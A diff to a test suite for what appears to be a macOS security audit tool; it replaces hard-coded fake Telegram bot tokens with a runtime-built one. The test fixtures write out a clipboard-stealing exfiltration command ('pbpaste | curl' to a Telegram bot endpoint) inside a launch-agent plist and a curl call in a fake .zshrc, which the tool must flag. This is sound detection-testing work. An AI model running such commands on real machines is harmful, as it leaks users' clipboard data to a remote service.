@@ -56,6 +56,12 @@ need_jq() {
   command -v jq >/dev/null 2>&1 || skip "jq is required for hook and MCP inspection"
 }
 
+# A bot-token-shaped string built at runtime, so no token literal sits in the repo
+# for secret scanners to flag.
+fake_bot_token() {
+  printf '123456789:%s' "$(printf '%035d' 0 | tr 0 A)"
+}
+
 # write_plist <label> <program> [arg...]
 write_plist() {
   local label="$1" program="$2" a
@@ -158,7 +164,7 @@ EOF
 
 @test "incident: the Telegram bot token is never printed" {
   write_incident with-payload
-  printf 'curl -s https://api.telegram.org/bot123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/sendMessage\n' >"$FAKE/.zshrc"
+  printf 'curl -s https://api.telegram.org/bot%s/sendMessage\n' "$(fake_bot_token)" >"$FAKE/.zshrc"
   audit
   assert_failure 1
   refute_output --partial "AAAAAAAAAAAAAAAA"
@@ -393,7 +399,7 @@ EOF
 }
 
 @test "plist: inline sh -c with capture and exfiltration is high" {
-  write_plist com.example.inline /bin/sh -c 'pbpaste | curl -s https://api.telegram.org/bot123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/sendMessage'
+  write_plist com.example.inline /bin/sh -c "pbpaste | curl -s https://api.telegram.org/bot$(fake_bot_token)/sendMessage"
   audit
   assert_failure 1
   assert_output --partial "Capture tool that reports to a remote service"
@@ -728,7 +734,7 @@ EOF
 }
 
 @test "agent: a Telegram bot token by shape is flagged and never printed" {
-  printf '{"note":"123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}\n' >"$FAKE/.claude.json"
+  printf '{"note":"%s"}\n' "$(fake_bot_token)" >"$FAKE/.claude.json"
   audit
   assert_failure 1
   assert_output --partial "Telegram bot token"
